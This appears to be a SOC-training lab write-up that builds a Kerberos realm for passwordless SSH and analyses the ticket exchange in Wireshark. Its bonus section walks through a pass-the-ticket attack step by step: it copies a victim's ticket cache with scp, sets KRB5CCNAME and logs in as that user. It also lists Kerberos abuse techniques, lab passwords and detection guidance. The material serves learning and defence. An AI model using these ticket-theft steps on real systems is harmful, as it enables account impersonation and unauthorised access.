# 🎫 Kerberos — Port 88 | Practical Lab

**Author:** Muhammad Awais Javed (Mian Awais) / **Date:** May 2026 / **Part of:** [SOC-Journey-2026](https://github.com/awaisjaved-soc/SOC-Journey-2026)

---

## 📌 Table of Contents

- [🎯 Objective](#-objective)
- [📖 What is Kerberos?](#-what-is-kerberos)
- [⚙️ How It Works](#️-how-it-works)
- [🧪 Lab Environment](#-lab-environment)
- [💻 Commands Used](#-commands-used)
- [🎭 Bonus: Pass-the-Ticket Attack Lab](#-bonus-pass-the-ticket-attack-lab)
- [🔍 Wireshark Analysis](#-wireshark-analysis)
- [🚨 SOC Analyst Notes](#-soc-analyst-notes)
- [🛡️ MITRE ATT&CK](#️-mitre-attck)
- [📸 Screenshots](#-screenshots)
- [✅ Key Takeaways](#-key-takeaways)

---

## 🎯 Objective

To build a working Kerberos realm from scratch, use it to log into a server over SSH **without typing a password**, watch the ticket exchange on the wire — and then flip to the attacker's side and steal a ticket to log in as someone else (pass-the-ticket).

---

## 📖 What is Kerberos?

**Kerberos** is a ticket-based network authentication protocol. Instead of sending your password to every server, you authenticate **once** to a central server (the KDC) and receive encrypted **tickets** that prove who you are to every other service. It runs on **port 88** (TCP/UDP) and is the backbone of Windows Active Directory authentication.

### Key vocabulary

| Term | Meaning |
|------|---------|
| **KDC** (Key Distribution Center) | The Kerberos server; has two parts: the Authentication Server (AS) and the Ticket Granting Server (TGS) |
| **Realm** | The Kerberos equivalent of a domain — here, `LAB.LOCAL` |
| **Principal** | A named identity, e.g. `awais@LAB.LOCAL` (user) or `host/kdc.lab.local@LAB.LOCAL` (service) |
| **TGT** (Ticket-Granting Ticket) | The "master ticket" you get at login; used to request service tickets without retyping your password |
| **Service ticket** | A ticket for one specific service (e.g. SSH on a host), obtained with the TGT |
| **Keytab** | A file holding a service's secret key so it can authenticate without a human typing a password |

### Why Kerberos instead of passwords everywhere?

- Your password crosses the network **once** (to the KDC) instead of to every server.
- Services never see your password — they see an encrypted ticket they can verify.
- Tickets **expire**, so stolen credentials have a limited lifetime (in theory — see the attack lab below).

---

## ⚙️ How It Works

### 🎟️ The normal flow: AS-REQ → TGS-REQ → SSH

1. **AS-REQ / AS-REP** — I run `kinit` and type my password once. The KDC's Authentication Server verifies me and returns a **TGT** (encrypted so only the KDC and I can use it).
2. **TGS-REQ / TGS-REP** — I `ssh` to the server. My machine shows the TGT to the Ticket Granting Server and asks for a **service ticket** for `host/kdc.lab.local`.
3. **AP-REQ** — my machine presents the service ticket to the SSH server, which verifies it against its keytab.
4. **SSH session** — I'm in, with **no password typed**. All of this happens on port 88 *before* a single SSH packet flows on port 22.

### 🎭 The attack flow: pass-the-ticket

Kerberos tickets live in a **credential cache** file (e.g. `/tmp/krb5cc_1000`). If an attacker copies that file, they *are* you as far as Kerberos is concerned — no password needed, no cracking required. Set `KRB5CCNAME` to the stolen file and every Kerberos tool uses it.

---

## 🧪 Lab Environment

| Role | Machine | Details |
|------|---------|---------|
| KDC Server (+ SSH) | `192.168.100.91` | Hostname `kdc.lab.local` — runs `krb5-kdc`, `krb5-admin-server`, `openssh-server` |
| Client | `192.168.100.90` | Hostname `client.lab.local` — runs `krb5-user` |
| Realm | `LAB.LOCAL` | Test user `awais@LAB.LOCAL` (password: `Password123`) |

---

## 💻 Commands Used

### Part 1 — KDC server setup (on `192.168.100.91`)

```bash
sudo hostnamectl set-hostname kdc.lab.local
```
Sets the server's hostname — Kerberos is picky about names matching.

```bash
sudo nano /etc/hosts
```
Edits the hosts file so both machines resolve each other without DNS. Contents:

```
127.0.0.1       localhost
127.0.1.1       kdc.lab.local kdc
192.168.100.91  kdc.lab.local kdc
192.168.100.90  client.lab.local client
```

```bash
sudo apt update
sudo apt install -y krb5-kdc krb5-admin-server krb5-user openssh-server
```
Installs the Kerberos KDC, its admin server, Kerberos client tools, and the SSH server.

```bash
sudo nano /etc/krb5.conf
```
The core Kerberos configuration — where the realm lives and how to reach the KDC:

```ini
[libdefaults]
    default_realm = LAB.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    LAB.LOCAL = {
        kdc = kdc.lab.local
        admin_server = kdc.lab.local
    }

[domain_realm]
    .lab.local = LAB.LOCAL
    lab.local = LAB.LOCAL
```

```bash
sudo krb5_newrealm
```
Creates the Kerberos database for the new realm. (Master password used here: `Password123`.)

```bash
sudo systemctl enable --now krb5-kdc krb5-admin-server ssh
```
Starts the KDC, admin server, and SSH — now and on every boot.

```bash
sudo kadmin.local -q "addprinc awais@LAB.LOCAL"
```
Creates the user principal `awais@LAB.LOCAL`. (Password set: `Password123`.)

```bash
sudo kadmin.local -q "addprinc -randkey host/kdc.lab.local@LAB.LOCAL"
sudo kadmin.local -q "ktadd -k /etc/krb5.keytab host/kdc.lab.local@LAB.LOCAL"
```
Creates the host principal for the SSH service with a random key and stores it in the keytab — this is the secret the SSH server uses to verify service tickets.

```bash
sudo nano /etc/ssh/sshd_config
```
Enables Kerberos authentication in SSH — add at the bottom:

```ini
GSSAPIAuthentication yes
GSSAPICleanupCredentials yes
```

```bash
sudo systemctl restart ssh
```
Restarts SSH so the GSSAPI settings take effect.

### Part 2 — Client setup and ticket login (on `192.168.100.90`)

```bash
sudo apt install -y krb5-user
```
Installs the Kerberos client tools (`kinit`, `klist`, `kdestroy`).

```bash
sudo nano /etc/krb5.conf
```
Client-side Kerberos config — points at the KDC by IP and port:

```ini
[libdefaults]
    default_realm = LAB.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    LAB.LOCAL = {
        kdc = 192.168.100.91:88
        admin_server = 192.168.100.91:749
    }

[domain_realm]
    .lab.local = LAB.LOCAL
    lab.local = LAB.LOCAL
```

```bash
kdestroy
klist
```
Wipes any existing tickets and confirms the cache is empty — the clean "before" state.

```bash
ssh awais@kdc.lab.local
```
Normal SSH first, to prove the baseline: it asks for `Password123`. Type it, then `exit`.

```bash
kinit awais@LAB.LOCAL
```
The Kerberos login — type `Password123` **once** and receive the TGT (the AS-REQ/AS-REP exchange).

```bash
klist
```
Shows the cached tickets — proof the TGT is there.

```bash
ssh -o GSSAPIAuthentication=yes awais@kdc.lab.local
```
Passwordless SSH using the Kerberos ticket. Inside the session:

```bash
whoami
ls /srv/samba/AwaisShare
exit
```

File transfer over the same authenticated channel:

```bash
scp -o GSSAPIAuthentication=yes awais@kdc.lab.local:/srv/samba/AwaisShare/filename .
```

Share permissions used in the lab:

```bash
sudo chown awais:awais /srv/samba/AwaisShare/filename
sudo chown -R awais:awais /srv/samba/AwaisShare
sudo chmod -R 775 /srv/samba/AwaisShare
```

---

## 🎭 Bonus: Pass-the-Ticket Attack Lab

**Scenario:** a user is logged in on the KDC server (`192.168.100.91`, the "victim") with a valid ticket. I'm on the client laptop (`192.168.100.90`, the "attacker"). Goal: log in as them without ever knowing the password.

### Phase 1 — On the victim machine (`192.168.100.91`)

Simulates the normal logged-in user whose ticket I'll steal:

```bash
su - awais
```
Become the normal user (enter the password if asked).

```bash
kinit awais@LAB.LOCAL
```
Get a fresh ticket — this is what the attacker wants. (Password: `Password123`.)

```bash
klist
```
Confirm the ticket exists. **Leave this terminal open** — the "logged-in user" stays logged in.

### Phase 2 — On the attacker machine (`192.168.100.90`)

```bash
ping -c 3 192.168.100.91
```
Confirm the victim is reachable.

```bash
scp awais@192.168.100.91:/tmp/krb5cc_1000 /tmp/stolen_ticket.kirbi
```
Copy the victim's ticket-cache file to the attacker machine. (This is the last time the password is typed — after this, it's never needed again.)

```bash
ls -l /tmp/stolen_ticket.kirbi
```
Verify the stolen ticket file landed.

### Phase 3 — Use the stolen ticket

```bash
export KRB5CCNAME=/tmp/stolen_ticket.kirbi
```
Point Kerberos at the stolen cache — every Kerberos tool now uses the victim's ticket.

```bash
klist
```
Confirm the stolen ticket shows as active.

```bash
ssh -o GSSAPIAuthentication=yes awais@kdc.lab.local
```
Log in to the victim machine **with no password prompt**. Inside:

```bash
whoami
hostname
ls /srv/samba/AwaisShare
exit
```

> The unsettling part: nothing was cracked. The ticket file *is* the identity — copying it is enough.

---

## 🔍 Wireshark Analysis

**Display filter:**
```
kerberos || ssh || (tcp.port == 88 || tcp.port == 22)
```

**Normal ticket login — what you will see:**

1. **First packets → Kerberos on port 88** — `AS-REQ`/`AS-REP` (the `kinit`), then `TGS-REQ`/`TGS-REP` when SSH asks for the service ticket. Kerberos visibly works **before** SSH.
2. **Then packets → SSH on port 22** — the encrypted session starts only after ticketing completes.

**Pass-the-ticket — what looks abnormal:**

- Many Kerberos packets on port 88 (`TGS-REQ`/`TGS-REP`) followed by SSH on port 22 — but **no password authentication anywhere** (no NTLM, no basic auth, nothing in cleartext).
- The traffic *looks* like a normal SSH session, yet authentication happened entirely via ticket.
- From the SOC chair, the tell is **ticket usage that doesn't match the user/machine pattern** — e.g. a ticket issued on one host suddenly used from another IP.

---

## 🚨 SOC Analyst Notes

**How attackers abuse Kerberos:**

- **Pass-the-ticket** — steal a ticket cache and impersonate the user. Demonstrated live in this lab.
- **Kerberoasting** — request service tickets for service accounts and crack their hashes offline (targets weak service-account passwords).
- **AS-REP roasting** — users with pre-authentication disabled leak crackable material in the AS-REP itself.
- **Golden ticket** — forge a TGT with the `krbtgt` account hash: unlimited, undetectable-by-expiry domain access.
- **Silver ticket** — forge a service ticket for one specific service; quieter, no KDC contact needed.

**What to monitor (port 88 and the DC logs):**

- Unusual `TGS-REQ` volume or service-ticket requests for odd services/times.
- Ticket requests from IPs that don't match the user's normal machine.
- RC4-encrypted tickets (`etype 23`) — downgrade indicator; modern Kerberos prefers AES.
- Event ID **4768** (TGT requested) / **4769** (service ticket requested) / **4771** (pre-auth failure) anomalies on the domain controller.
- Accounts with "Do not require Kerberos preauthentication" enabled — AS-REP roasting targets.

---

## 🛡️ MITRE ATT&CK

| Technique | ID | Relevance |
|-----------|----|-----------|
| Steal or Forge Kerberos Tickets | **T1558** | Pass-the-ticket (demonstrated), Golden/Silver ticket, Kerberoasting |
| Valid Accounts | **T1078** | Ticket reuse as a valid identity |
| Brute Force: Password Cracking | **T1110.002** | Offline cracking of Kerberoasted / AS-REP-roasted hashes |
| Remote Services: SSH | **T1021.004** | The service accessed with the stolen ticket |

---

## 📸 Screenshots

| Capture | File |
|---------|------|
| Kerberos ticket-granting packets (port 88) | [`kerberose granting packets.png`](./kerberose%20granting%20packets.png) |
| SSH session initialization packets | [`ssh initialization packets.png`](./ssh%20initialization%20packets.png) |
| SSH + SCP file-transfer packets | [`ssh and scp file transfering packets.png`](./ssh%20and%20scp%20file%20transfering%20packets.png) |

---

## ✅ Key Takeaways

- I built a real Kerberos realm (`LAB.LOCAL`): KDC on `192.168.100.91`, client on `192.168.100.90`, user principal `awais@LAB.LOCAL` — and logged into SSH with `kinit` + `GSSAPIAuthentication`, no password typed.
- Wireshark proves the order of operations: Kerberos on port 88 (AS-REQ/AS-REP, then TGS-REQ/TGS-REP) happens *before* SSH on port 22.
- Then I attacked it: copied `/tmp/krb5cc_1000` off the "victim", set `KRB5CCNAME`, and logged in as them — pass-the-ticket needs no cracking, because the ticket file *is* the identity.
- As a SOC analyst, I now know what to hunt: odd TGS-REQ patterns, tickets used from the wrong machine, RC4 downgrade, and the DC event IDs (4768/4769/4771) behind every ticket on the network.
